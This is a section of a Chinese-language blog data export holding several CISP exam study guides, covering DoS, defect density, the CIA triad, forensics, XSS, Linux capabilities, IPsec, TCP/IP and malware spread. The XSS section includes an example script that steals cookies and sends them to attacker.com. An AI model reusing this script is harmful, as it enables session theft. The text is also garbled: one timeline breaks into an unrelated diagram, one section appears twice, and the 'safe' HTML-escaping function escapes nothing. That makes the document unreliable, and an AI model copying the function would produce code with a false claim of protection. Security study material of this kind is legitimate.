拒绝服务攻击（DoS）Denial of Service Attack 通过消耗系统资源使软件无法响应正常请求的一种攻击方式。 攻击目标： 💻 系统资源 CPU资源 内存资源 网络带宽 磁盘I/O 数据库连接 🎯 攻击效果 系统响应缓慢 服务不可用 业务中断 用户无法访问 2.2 DoS攻击方式 💡 软件开发中需要考虑的DoS攻击方式针对软件的拒绝服务攻击是通过消耗系统资源使软件无法响应正常请求的一种攻击方式。在软件开发时分析拒绝服务攻击的威胁，需要重点关注应用层攻击。 需要考虑的攻击方式： ✅ CPU资源耗尽攻击 攻击者利用软件存在的逻辑错误，通过发送某种类型数据导致运算进入死循环，CPU资源占用始终100% 这是典型的DoS攻击方式 利用逻辑漏洞消耗CPU资源 属于应用层DoS攻击 ✅ 数据库资源耗尽攻击 攻击者利用软件脚本使用多重嵌套查询，在数据量大时会导致查询效率低，通过发送大量的查询导致数据库响应缓慢 这是SQL查询DoS攻击 利用低效查询消耗数据库资源 属于应用层DoS攻击 ✅ 连接资源耗尽攻击 攻击者利用软件不自动释放连接的问题，通过发送大量连接消耗软件并发连接数，导致并发连接数耗尽而无法访问 这是连接耗尽DoS攻击 利用资源泄露消耗连接资源 属于应用层DoS攻击 不需要在软件开发中考虑的攻击： ❌ 物理攻击 例如：攻击者买通IDC人员，将某软件运行服务器的网线拔掉导致无法访问 这不是软件层面的DoS攻击 不属于软件开发需要考虑的威胁 应通过物理安全和人员管理防范 DoS攻击分类： graph TB A[\"拒绝服务攻击\"] B[\"网络层DoS\"] C[\"应用层DoS\"] D[\"物理层攻击\"] A --> B A --> C A --> D B --> B1[\"SYN Flood\"] B --> B2[\"UDP Flood\"] B --> B3[\"ICMP Flood\"] C --> C1[\"逻辑漏洞\"] C --> C2[\"资源耗尽\"] C --> C3[\"慢速攻击\"] D --> D1[\"物理破坏\"] D --> D2[\"断电断网\"] C1 --> C1A[\"死循环\"] C2 --> C2A[\"连接耗尽\"] C3 --> C3A[\"慢速查询\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffcdd2,stroke:#c62828 2.3 应用层DoS攻击详解 三种典型的应用层DoS攻击： 应用层DoS攻击方式： ├── 1. CPU资源耗尽攻击 │ ├── 攻击方式： │ │ ├── 利用逻辑错误导致死循环 │ │ ├── 触发复杂计算 │ │ ├── 正则表达式回溯 │ │ └── 加密解密操作 │ ├── 攻击效果： │ │ ├── CPU占用100% │ │ ├── 系统响应缓慢 │ │ └── 无法处理正常请求 │ └── 防御措施： │ ├── 代码审查 │ ├── 输入验证 │ ├── 超时控制 │ └── 资源限制 ├── 2. 数据库资源耗尽攻击 │ ├── 攻击方式： │ │ ├── 多重嵌套查询 │ │ ├── 全表扫描 │ │ ├── 笛卡尔积查询 │ │ └── 大量JOIN操作 │ ├── 攻击效果： │ │ ├── 数据库响应缓慢 │ │ ├── 查询超时 │ │ └── 数据库连接耗尽 │ └── 防御措施： │ ├── 查询优化 │ ├── 索引优化 │ ├── 查询超时设置 │ ├── 限制查询复杂度 │ └── 数据库连接池 └── 3. 连接资源耗尽攻击 ├── 攻击方式： │ ├── 大量建立连接 │ ├── 不释放连接 │ ├── 慢速连接 │ └── 保持连接不活动 ├── 攻击效果： │ ├── 并发连接数耗尽 │ ├── 新连接无法建立 │ └── 服务不可用 └── 防御措施： ├── 连接超时设置 ├── 自动释放连接 ├── 连接数限制 ├── 连接池管理 └── 空闲连接回收 2.4 DoS防御策略 综合防御措施： 🛡️ DoS防御最佳实践代码层面： 避免死循环和无限递归 优化算法复杂度 实施输入验证 设置操作超时 资源管理： 限制并发连接数 实施资源配额 自动释放资源 连接池管理 数据库层面： 优化查询语句 建立合适索引 限制查询复杂度 设置查询超时 网络层面： 流量限制 速率限制 异常检测 黑名单机制 三、软件缺陷密度 3.1 软件缺陷密度概念 软件缺陷密度的定义： 📊 软件缺陷密度Defects per KLOC (Thousand Lines of Code) 用于衡量软件质量和安全性的重要指标。 计算公式： 软件缺陷密度 = 缺陷总数 / (代码行数 / 1000) 单位： Defects/KLOC 每千行代码的缺陷数 3.2 缺陷密度计算 💡 软件缺陷密度计算示例软件存在漏洞和缺陷是不可避免的，实践中常用软件缺陷密度（Defects/KLOC）来衡量软件的安全性。 计算示例： 假设某个软件共有29.6万行源代码，总共被检测出145个缺陷。 已知条件： 代码行数：29.6万行 = 296,000行 缺陷总数：145个 步骤1：将代码行数转换为KLOC KLOC = 296,000 / 1000 = 296 步骤2：计算缺陷密度 缺陷密度 = 缺陷总数 / KLOC 缺陷密度 &#x3D; 145 &#x2F; 296 缺陷密度 &#x3D; 0.4898... 缺陷密度 ≈ 0.49 **结果：该软件的缺陷密度为 0.49 Defects/KLOC** 计算示例图示： graph LR A[\"代码行数296,000行\"] --> B[\"转换为KLOC296 KLOC\"] C[\"缺陷总数145个\"] --> D[\"计算密度145 ÷ 296\"] B --> D D --> E[\"缺陷密度0.49\"] style A fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#ffebee,stroke:#c62828 3.3 缺陷密度的意义 缺陷密度的应用： 应用场景 说明 目的 质量评估 评估软件整体质量 了解软件成熟度 安全评估 评估软件安全性 识别安全风险 项目管理 跟踪开发进度 控制质量目标 对比分析 与行业标准对比 找出改进方向 趋势分析 跟踪历史变化 评估改进效果 行业参考标准： 📈 缺陷密度参考值一般软件： 优秀：&lt; 0.5 Defects/KLOC 良好：0.5 - 1.0 Defects/KLOC 一般：1.0 - 2.0 Defects/KLOC 较差：&gt; 2.0 Defects/KLOC 安全关键软件： 要求更严格 通常 &lt; 0.1 Defects/KLOC 如航空、医疗、金融系统 注意： 不同类型软件标准不同 需要结合具体场景评估 缺陷严重程度也很重要 3.4 降低缺陷密度的方法 提高软件质量的措施： 降低缺陷密度的方法： ├── 开发阶段 │ ├── 采用安全编码规范 │ ├── 代码审查 │ ├── 结对编程 │ ├── 单元测试 │ └── 静态代码分析 ├── 测试阶段 │ ├── 功能测试 │ ├── 安全测试 │ ├── 渗透测试 │ ├── 模糊测试 │ └── 回归测试 ├── 工具支持 │ ├── 静态分析工具 │ ├── 动态分析工具 │ ├── 漏洞扫描工具 │ ├── 代码审计工具 │ └── 自动化测试工具 └── 管理措施 ├── 建立质量标准 ├── 缺陷跟踪管理 ├── 持续集成 ├── 定期评审 └── 培训和提升 四、总结 Web服务器与软件安全的核心要点： Apache安全配置：修改httpd.conf隐藏版本信息 DoS攻击防御：关注应用层攻击，物理攻击不属于软件开发考虑范围 软件缺陷密度：用于衡量软件质量，计算公式为缺陷数/KLOC 🎯 关键要点 Apache通过修改httpd.conf中ServerTokens和ServerSignature参数隐藏版本信息 应用层DoS攻击包括：CPU资源耗尽、数据库资源耗尽、连接资源耗尽 物理攻击（如拔网线）不属于软件开发需要考虑的DoS威胁 软件缺陷密度 = 缺陷总数 / (代码行数 / 1000) 优秀软件的缺陷密度应 &lt; 0.5 Defects/KLOC 💡 实践建议 部署Web服务器后立即进行安全加固 隐藏所有可能泄露的系统信息 在软件开发阶段考虑DoS攻击威胁 实施资源限制和超时控制 定期进行代码审查和安全测试 跟踪和降低软件缺陷密度 建立完善的质量管理体系","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：信息安全CIA三要素","slug":"2025/10/CISP-CIA-Triad-zh-CN","date":"un66fin66","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-CIA-Triad/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-CIA-Triad/","excerpt":"深入解析信息安全的核心基础——CIA三要素（保密性、完整性、可用性），理解信息安全的基本目标和防护措施。","text":"CIA三要素是信息安全的基础框架，所有安全措施都围绕保护信息的保密性、完整性和可用性展开。 一、CIA三要素概述 1.1 什么是CIA三要素 🔐 信息安全的三大支柱CIA三要素是信息安全的核心目标： C - Confidentiality（保密性） 确保信息不被未授权访问 防止信息泄露 I - Integrity（完整性） 确保信息不被未授权修改 保证信息的准确性和一致性 A - Availability（可用性） 确保授权用户能够及时访问信息 保证系统和服务的正常运行 graph LR A[\"信息安全CIA三要素\"] B[\"保密性Confidentiality\"] C[\"完整性Integrity\"] D[\"可用性Availability\"] A --> B A --> C A --> D B --> B1[\"防止未授权访问\"] B --> B2[\"加密保护\"] B --> B3[\"访问控制\"] C --> C1[\"防止未授权修改\"] C --> C2[\"数字签名\"] C --> C3[\"哈希校验\"] D --> D1[\"确保服务可用\"] D --> D2[\"冗余备份\"] D --> D3[\"DDoS防护\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d 1.2 CIA三要素的重要性 💡 为什么CIA三要素重要CIA三要素是信息安全的基础： 所有安全措施都围绕保护CIA展开 安全威胁分析基于CIA受损情况 安全控制措施针对CIA进行设计 安全事件影响评估依据CIA损失 二、CIA三要素详解 2.1 保密性（Confidentiality） 保密性的定义： 确保信息不被未授权的个人、实体或进程访问或泄露。 保密性威胁： 窃听和监听 数据泄露 社会工程学攻击 未授权访问 保密性防护措施： 保密性防护： ├── 访问控制 │ ├── 身份认证 │ ├── 权限管理 │ └── 最小权限原则 ├── 加密技术 │ ├── 数据加密 │ ├── 传输加密 │ └── 存储加密 └── 物理安全 ├── 门禁控制 └── 介质保护 2.2 完整性（Integrity） 完整性的定义： 确保信息在存储、传输和处理过程中不被未授权修改、删除或破坏，保持信息的准确性和完整性。 完整性威胁： 数据篡改 中间人攻击 恶意代码注入 系统配置被修改 完整性防护措施： 完整性防护： ├── 哈希校验 │ ├── MD5&#x2F;SHA校验和 │ └── 文件完整性监控 ├── 数字签名 │ ├── 验证数据来源 │ └── 确保未被篡改 ├── 版本控制 │ └── 变更管理 └── 访问控制 └── 防止未授权修改 2.3 可用性（Availability） 可用性的定义： 确保授权用户在需要时能够及时访问信息和使用系统资源。 可用性威胁： DDoS攻击 系统故障 自然灾害 人为破坏 可用性防护措施： 可用性防护： ├── 冗余设计 │ ├── 服务器冗余 │ ├── 网络冗余 │ └── 电源冗余 ├── 备份恢复 │ ├── 数据备份 │ ├── 系统备份 │ └── 灾难恢复 ├── DDoS防护 │ ├── 流量清洗 │ └── 负载均衡 └── 监控告警 └── 实时监控 三、CIA三要素对比 保密性、完整性、可用性对比： 要素 目标 威胁示例 防护措施 保密性 防止信息泄露 窃听、数据泄露 加密、访问控制 完整性 防止信息篡改 数据篡改、中间人攻击 数字签名、哈希校验 可用性 确保服务可用 DDoS攻击、系统故障 冗余、备份、防护 四、CIA三要素的应用 4.1 安全设计中的CIA 在安全设计中应用CIA： 安全措施 保密性 完整性 可用性 访问控制 ✅ 主要 ✅ 辅助 ❌ 加密 ✅ 主要 ❌ ❌ 数字签名 ❌ ✅ 主要 ❌ 哈希校验 ❌ ✅ 主要 ❌ 备份 ❌ ✅ 辅助 ✅ 主要 冗余 ❌ ❌ ✅ 主要 DDoS防护 ❌ ❌ ✅ 主要 4.2 威胁分析中的CIA 常见攻击对CIA的影响： 攻击类型 破坏保密性 破坏完整性 破坏可用性 窃听 ✅ ❌ ❌ 数据泄露 ✅ ❌ ❌ 数据篡改 ❌ ✅ ❌ 中间人攻击 ✅ ✅ ❌ DDoS攻击 ❌ ❌ ✅ 勒索软件 ✅ ✅ ✅ 系统故障 ❌ ❌ ✅ 💡 DDoS攻击与可用性DDoS（分布式拒绝服务）攻击主要破坏系统的可用性。详细内容请参考： CISP学习指南：网络基础知识 - DDoS攻击与可用性 4.3 CIA在其他安全领域的应用 CIA在不同安全领域的体现： 访问控制：主要保护保密性和完整性 密码学：主要保护保密性 备份恢复：主要保护可用性 数字签名：主要保护完整性 防火墙：保护保密性和可用性 入侵检测：保护完整性和可用性 五、总结 CIA三要素的核心要点： 🎯 关键要点 CIA三要素是信息安全的基础框架 保密性（Confidentiality）：防止信息泄露 完整性（Integrity）：防止信息篡改 可用性（Availability）：确保服务可用 所有安全措施都围绕保护CIA展开 DDoS攻击主要破坏可用性 数据加密主要保护保密性 数字签名主要保护完整性 💡 实践建议 在设计安全方案时，全面考虑CIA三要素 根据业务需求确定CIA的优先级 实施多层防护，保护CIA三要素 定期评估CIA受保护情况 在威胁分析时，评估对CIA的影响 平衡CIA三要素，避免顾此失彼","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：计算机取证、网络安全与系统保障","slug":"2025/10/CISP-Forensics-Network-Security-zh-CN","date":"un66fin66","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Forensics-Network-Security/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Forensics-Network-Security/","excerpt":"深入解析CISP认证中的计算机取证、灾难恢复指标、Web攻击防护、Linux权能管理、IPsec VPN和TCP/IP协议栈等核心知识点。","text":"本指南涵盖CISP认证中的计算机取证、灾难恢复、网络安全攻击防护、系统安全管理等关键领域的核心知识点。 一、计算机取证 1.1 计算机取证概述 📚 计算机取证定义计算机取证是使用先进的技术和工具，按照标准规程全面地检查计算机系统，以提取和保护有关计算机犯罪的相关证据的活动。 核心目标： 通过证据查找肇事者 通过证据推断受害者损失程度 收集证据提供法律支持 1.2 电子证据 🔍 电子证据电子证据是计算机系统运行过程中产生的各种信息记录存储的电子化资料及物品。 取证工作的三个核心方面： 证据的获取 证据的保护 证据的分析 ⚠️ 常见误解： ⚠️ 注意取证工作不仅仅围绕&quot;证据的获取&quot;和&quot;证据的保护&quot;两方面进行，还包括证据的分析。 完整的取证工作包括： 证据获取 证据保护 证据分析 证据提交 1.3 计算机取证流程 graph LR A[\"准备Preparation\"] --> B[\"保护Protection\"] B --> C[\"提取Extraction\"] C --> D[\"分析Analysis\"] D --> E[\"提交Presentation\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#ffebee,stroke:#c62828 五个步骤详解： 步骤 说明 关键活动 1. 准备 制定取证计划和准备工具 确定取证目标、准备取证工具包、获取授权 2. 保护 保护现场和证据 隔离系统、防止证据被破坏、记录现场状态 3. 提取 收集和复制证据 创建镜像、提取日志、收集易失性数据 4. 分析 分析证据内容 数据恢复、时间线分析、关联分析 5. 提交 形成报告并提交 编写报告、准备法庭证词、保存证据链 1.4 取证最佳实践 证据链管理： 📝 详细记录每个操作步骤 🔒 确保证据的完整性（使用哈希值） 👥 明确责任人和交接记录 📅 记录时间戳 🔐 安全存储原始证据 取证工具： 磁盘镜像工具（dd, FTK Imager） 内存取证工具（Volatility, Rekall） 网络取证工具（Wireshark, tcpdump） 日志分析工具 文件恢复工具 二、灾难恢复指标 2.1 RPO和RTO 📊 关键指标RPO（Recovery Point Objective，恢复点目标） 定义：系统能够容忍的最大数据丢失量 单位：时间（如3小时） 含义：若RPO为3小时，意味着系统恢复后，至多能丢失3小时的业务数据 RTO（Recovery Time Objective，恢复时间目标） 定义：系统从故障到恢复正常运行的最大可容忍时间 单位：时间（如1小时） 含义：若RTO为1小时，意味着系统必须在1小时内恢复运行 2.2 RPO详解 RPO示例场景： 假设某电子商务系统的RPO为3小时： timeline title RPO = 3小时的数据恢复场景 09&colon;S: 访问社交网站 S->>U: 显示页面（含恶意广告） U->>A: 点击广告 A->>U: 执行XSS脚本 A->>T: 重定向到旅游网站 U->>T: 被动访问旅游网站 T->>T: 截获用户社交信息 Note over T: 获取用户及好友信息 3.2 XSS攻击类型 三种主要类型： 类型 说明 特点 反射型XSS 恶意代码在URL中，服务器反射回页面 需要用户点击恶意链接 存储型XSS 恶意代码存储在服务器（如数据库） 影响所有访问该页面的用户 DOM型XSS 恶意代码在客户端执行，不经过服务器 完全在客户端发生 XSS攻击示例代码： &lt;!-- 恶意广告中的XSS脚本 --&gt; &lt;script&gt; &#x2F;&#x2F; 窃取用户cookie var cookie &#x3D; document.cookie; &#x2F;&#x2F; 发送到攻击者服务器 new Image().src &#x3D; &quot;http:&#x2F;&#x2F;attacker.com&#x2F;steal?cookie&#x3D;&quot; + cookie; &#x2F;&#x2F; 重定向到旅游网站 window.location &#x3D; &quot;http:&#x2F;&#x2F;travel-site.com&quot;; &lt;&#x2F;script&gt; 3.3 其他Web攻击类型 常见Web攻击对比： 攻击类型 目标 攻击方式 影响 XSS 用户浏览器 注入恶意脚本 窃取信息、会话劫持 SQL注入 数据库 注入恶意SQL语句 数据泄露、数据篡改 CSRF 用户会话 伪造用户请求 未授权操作 缓冲区溢出 应用程序 超长输入 代码执行、系统崩溃 DDoS 服务可用性 大量请求 服务中断 3.4 XSS防护措施 防护策略： ✅ 输入验证：验证和过滤用户输入 ✅ 输出编码：对输出内容进行HTML编码 ✅ CSP（内容安全策略）：限制脚本来源 ✅ HttpOnly Cookie：防止JavaScript访问Cookie ✅ X-XSS-Protection头：启用浏览器XSS过滤 输出编码示例： &#x2F;&#x2F; 不安全的做法 element.innerHTML &#x3D; userInput; &#x2F;&#x2F; 安全的做法 element.textContent &#x3D; userInput; &#x2F;&#x2F; 或使用编码函数 function escapeHtml(text) &#123; return text .replace(&#x2F;&amp;&#x2F;g, &quot;&amp;&quot;) .replace(&#x2F;&lt;&#x2F;g, &quot;&lt;&quot;) .replace(&#x2F;&gt;&#x2F;g, &quot;&gt;&quot;) .replace(&#x2F;&quot;&#x2F;g, &quot;&quot;&quot;) .replace(&#x2F;&#39;&#x2F;g, &quot;&#039;&quot;); &#125; 四、Linux权能管理 4.1 权能机制概述 🔐 Linux权能（Capabilities）从Linux内核2.1版开始，实现了基于权能的特权管理机制，实现了对超级用户的特权分割。 核心思想： 打破UNIX/LINUX中超级用户/普通用户的二元概念 将root权限细分为多个独立的权能 提高操作系统的安全性 4.2 权能管理特性 权能机制的关键特性： 特性 说明 示例 权能分配 普通用户shell没有任何权能 默认无特权 超级用户权能 root在启动时拥有全部权能 完整权限集 权能放弃 进程可以放弃自己的某些权能 主动降权 权能不可恢复 系统管理员不能恢复超级用户已放弃的权能 ⚠️ 重要限制 ⚠️ 常见误解错误说法：系统管理员可以剥夺和恢复超级用户的某些权能。 ❌ 为什么这是错误的： 进程可以主动放弃自己的权能 但一旦放弃，无法恢复 系统管理员也不能恢复已放弃的权能 ✅ 正确理解： 权能只能被放弃，不能被恢复 这是一种单向的安全机制 需要重启进程才能重新获得权能 4.3 常见Linux权能 部分Linux权能列表： 权能 说明 用途 CAP_CHOWN 修改文件所有者 chown命令 CAP_NET_BIND_SERVICE 绑定小于1024的端口 Web服务器 CAP_NET_ADMIN 网络管理操作 配置网络接口 CAP_SYS_ADMIN 系统管理操作 挂载文件系统 CAP_SYS_TIME 修改系统时间 date命令 CAP_KILL 发送信号给任意进程 kill命令 4.4 权能管理实践 查看进程权能： # 查看当前进程的权能 cat &#x2F;proc&#x2F;self&#x2F;status | grep Cap # 查看特定进程的权能 cat &#x2F;proc&#x2F;[PID]&#x2F;status | grep Cap # 使用capsh查看权能 capsh --print 设置文件权能： # 给可执行文件设置权能 sudo setcap cap_net_bind_service&#x3D;+ep &#x2F;usr&#x2F;bin&#x2F;myapp # 查看文件权能 getcap &#x2F;usr&#x2F;bin&#x2F;myapp # 移除文件权能 sudo setcap -r &#x2F;usr&#x2F;bin&#x2F;myapp 权能使用示例： # 允许普通用户运行的程序绑定80端口 # 而不需要完整的root权限 sudo setcap cap_net_bind_service&#x3D;+ep &#x2F;usr&#x2F;bin&#x2F;node # 现在普通用户可以运行 node server.js # 监听80端口 五、信息系统安全保障 5.1 安全保障评估框架 📋 GB/T 20274.1-2006《信息安全技术 信息系统安全保障评估框架 第一部分：简介和一般模型》 定义了信息系统安全保障模型的三个核心方面： 保障要素 生命周期 安全特征 5.2 保障模型三要素 graph LR A[\"信息系统安全保障模型\"] B[\"保障要素Assurance Elements\"] C[\"生命周期Life Cycle\"] D[\"安全特征Security Features\"] A --> B A --> C A --> D B --> B1[\"技术\"] B --> B2[\"管理\"] B --> B3[\"工程\"] B --> B4[\"人员\"] C --> C1[\"规划设计\"] C --> C2[\"实施建设\"] C --> C3[\"运行维护\"] C --> C4[\"废弃\"] D --> D1[\"机密性\"] D --> D2[\"完整性\"] D --> D3[\"可用性\"] D --> D4[\"可控性\"] D --> D5[\"可审查性\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 三要素详解： 要素 说明 内容 保障要素 实现安全保障的手段 技术、管理、工程、人员 生命周期 系统的各个阶段 规划、实施、运行、废弃 安全特征 安全目标和属性 机密性、完整性、可用性等 5.3 保障要素 四类保障要素： 🔧 技术：安全技术和产品 📋 管理：安全策略和制度 🏗️ 工程：安全建设和实施 👥 人员：安全意识和技能 5.4 生命周期 系统生命周期阶段： 规划设计：需求分析、架构设计 实施建设：开发、测试、部署 运行维护：监控、更新、优化 废弃：数据销毁、系统下线 5.5 安全特征 五大安全特征： 🔒 机密性：防止信息泄露 ✅ 完整性：防止信息被篡改 🚀 可用性：确保服务可用 🎛️ 可控性：控制信息流向 📊 可审查性：记录和审计 六、IPsec VPN 6.1 IPsec VPN概述 🔐 IPsec VPNIPsec（Internet Protocol Security）VPN是一种在IP层提供安全通信的协议套件。 核心功能： 数据加密（机密性） 数据完整性验证 身份认证 防重放攻击 6.2 IPsec协议和算法 常见误解： ⚠️ 算法功能混淆 ❌ MD5不提供数据加密，它是哈希算法，用于完整性验证 ❌ AES不提供完整性验证，它是加密算法，用于数据加密 ❌ AH协议不提供数据机密性，它只提供完整性和认证 ✅ 正确理解： MD5/SHA：完整性验证（哈希） AES/3DES：数据加密（机密性） AH：认证和完整性 ESP：加密、认证和完整性 IPsec协议和算法对比： 类型 名称 功能 用途 协议 AH 认证、完整性 数据完整性保护 协议 ESP 加密、认证、完整性 全面安全保护 加密 AES 数据加密 保护机密性 加密 3DES 数据加密 保护机密性 哈希 MD5 完整性验证 检测篡改 哈希 SHA 完整性验证 检测篡改 6.3 IPsec VPN部署 部署最佳实践： 💡 IP地址规划部署IPsec VPN时，需要考虑IP地址的规划： ✅ 在分支节点使用可以聚合的IP地址段 ✅ 减少IPsec安全关联（SA）资源的消耗 ✅ 简化路由配置 ✅ 提高管理效率 IP地址聚合示例： # 不好的做法（分散的地址） 分支1: 192.168.1.0&#x2F;24 分支2: 172.16.5.0&#x2F;24 分支3: 10.0.100.0&#x2F;24 # 好的做法（可聚合的地址） 分支1: 10.1.1.0&#x2F;24 分支2: 10.1.2.0&#x2F;24 分支3: 10.1.3.0&#x2F;24 聚合: 10.1.0.0&#x2F;16 6.4 IPsec SA（安全关联） SA的概念： 📝 SA是IPsec通信的基础 🔑 定义了安全参数（算法、密钥等） 🔄 单向的（需要两个SA实现双向通信） 💾 消耗系统资源 减少SA消耗的方法： 使用地址聚合 合理规划隧道 使用动态路由协议 定期清理无用SA 七、TCP/IP协议栈 7.1 TCP/IP模型 📚 TCP/IP四层模型TCP/IP协议栈包含四层： 应用层（Application Layer） 传输层（Transport Layer） 互联网络层（Internet Layer） 网络接口层（Network Interface Layer） 7.2 数据封装顺序 数据封装流程： graph TB A[\"应用层Application Layer\"] --> B[\"传输层Transport Layer\"] B --> C[\"互联网络层Internet Layer\"] C --> D[\"网络接口层Network Interface Layer\"] A1[\"应用数据\"] --> B1[\"TCP/UDP头 + 数据\"] B1 --> C1[\"IP头 + TCP/UDP头 + 数据\"] C1 --> D1[\"帧头 + IP头 + TCP/UDP头 + 数据 + 帧尾\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 正确的封装顺序： ✅ 正确答案数据封装的顺序是：传输层 → 互联网络层 → 网络接口层 传输层：添加TCP或UDP头部 互联网络层：添加IP头部 网络接口层：添加以太网帧头和帧尾 7.3 各层协议 TCP/IP各层主要协议： 层次 主要协议 功能 应用层 HTTP, FTP, SMTP, DNS 应用程序通信 传输层 TCP, UDP 端到端通信 互联网络层 IP, ICMP, ARP 路由和寻址 网络接口层 Ethernet, Wi-Fi 物理传输 七、TCP/IP协议栈 7.1 TCP/IP模型 📚 TCP/IP四层模型TCP/IP协议栈包含四层： 应用层（Application Layer） 传输层（Transport Layer） 互联网络层（Internet Layer） 网络接口层（Network Interface Layer） 7.2 数据封装顺序 数据封装流程： graph TB A[\"应用层Application Layer\"] --> B[\"传输层Transport Layer\"] B --> C[\"互联网络层Internet Layer\"] C --> D[\"网络接口层Network Interface Layer\"] A1[\"应用数据\"] --> B1[\"TCP/UDP头 + 数据\"] B1 --> C1[\"IP头 + TCP/UDP头 + 数据\"] C1 --> D1[\"帧头 + IP头 + TCP/UDP头 + 数据 + 帧尾\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 正确的封装顺序： ✅ 正确答案数据封装的顺序是：传输层 → 互联网络层 → 网络接口层 传输层：添加TCP或UDP头部 互联网络层：添加IP头部 网络接口层：添加以太网帧头和帧尾 7.3 各层协议 TCP/IP各层主要协议： 层次 主要协议 功能 应用层 HTTP, FTP, SMTP, DNS 应用程序通信 传输层 TCP, UDP 端到端通信 互联网络层 IP, ICMP, ARP 路由和寻址 网络接口层 Ethernet, Wi-Fi 物理传输 7.4 封装和解封装 发送数据（封装）： 应用数据 ↓ 传输层添加TCP头 TCP段 ↓ 网络层添加IP头 IP数据包 ↓ 数据链路层添加帧头和帧尾 以太网帧 ↓ 物理层 比特流 接收数据（解封装）： 比特流 ↓ 物理层 以太网帧 ↓ 数据链路层移除帧头和帧尾 IP数据包 ↓ 网络层移除IP头 TCP段 ↓ 传输层移除TCP头 应用数据 八、总结 8.1 核心知识点 计算机取证： 取证流程：准备、保护、提取、分析、提交 取证工作包括：证据获取、保护和分析 灾难恢复： RPO（恢复点目标）：关注数据丢失，至多能丢失的数据量 RTO（恢复时间目标）：关注停机时间 Web安全： XSS攻击：向Web页面插入恶意HTML代码或脚本 防护：输入验证、输出编码、CSP Linux权能： 权能可以被放弃，但不能被恢复 打破超级用户/普通用户的二元概念 安全保障： 三要素：保障要素、生命周期、安全特征 不包括&quot;运行维护&quot;或&quot;规划组织&quot; IPsec VPN： MD5用于完整性验证，不提供加密 AES用于加密，不提供完整性验证 AH不提供机密性 部署时需考虑IP地址聚合 TCP/IP： 封装顺序：传输层 → 互联网络层 → 网络接口层 8.2 考试要点 💡 考试提示 记住取证的五个步骤 区分RPO和RTO的含义 理解XSS攻击的原理和防护 记住Linux权能不可恢复的特性 掌握安全保障模型的三要素 区分IPsec中加密和哈希算法的功能 记住TCP/IP数据封装的正确顺序 相关资源： GB/T 20274.1-2006 信息系统安全保障评估框架 RFC 4301 - Security Architecture for the Internet Protocol OWASP Top 10 Web Application Security Risks","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：恶意代码传播方式","slug":"2025/10/CISP-Malware-Propagation-Methods-zh-CN","date":"un66fin66","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Malware-Propagation-Methods/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Malware-Propagation-Methods/","excerpt":"深入解析CISP认证中的恶意代码传播方式，包括即时通讯、电子邮件、网络蠕虫、移动存储介质等传播途径及防护措施。","text":"恶意代码的传播方式是信息安全防护的重要知识点，了解各种传播途径有助于制定有效的防护策略。 一、恶意代码传播方式概述 1.1 传播方式分类 主要传播途径： graph LR A[\"恶意代码传播方式\"] B[\"网络传播\"] C[\"介质传播\"] D[\"社会工程\"] E[\"系统漏洞\"] A --> B A --> C A --> D A --> E B --> B1[\"即时通讯\"] B --> B2[\"电子邮件\"] B --> B3[\"网络蠕虫\"] B --> B4[\"网页挂马\"] C --> C1[\"U盘/移动硬盘\"] C --> C2[\"光盘\"] C --> C3[\"移动设备\"] D --> D1[\"钓鱼攻击\"] D --> D2[\"诱骗下载\"] D --> D3[\"伪装程序\"] E --> E1[\"系统漏洞利用\"] E --> E2[\"应用漏洞利用\"] E --> E3[\"0day攻击\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#ffcdd2,stroke:#c62828 二、即时通讯传播 2.1 即时通讯传播特点 💡 恶意代码利用即时通讯进行传播的方式即时通讯传播的主要方式： A. 通过即时通讯软件发送带有恶意代码的文件 ✅ 最常见的传播方式 利用用户对好友的信任 伪装成图片、文档、压缩包等 诱导用户点击下载 B. 通过即时通讯软件发送带有恶意链接的消息 ✅ 常见传播方式 链接指向恶意网站 利用短链接隐藏真实地址 诱导用户点击访问 C. 利用即时通讯软件的漏洞自动传播 ✅ 技术性传播方式 无需用户交互 利用软件安全漏洞 自动感染联系人 D. 以上都是 ✅ 正确答案 即时通讯传播方式多样 需要综合防护 即时通讯传播流程： sequenceDiagram participant A as 攻击者 participant V as 受害者A participant C as 受害者B A->>V: 1. 发送恶意文件/链接 V->>V: 2. 点击并感染 V->>C: 3. 自动向联系人传播 C->>C: 4. 点击并感染 C->>C: 5. 继续传播... Note over A,C: 利用信任关系快速传播 2.2 即时通讯传播案例 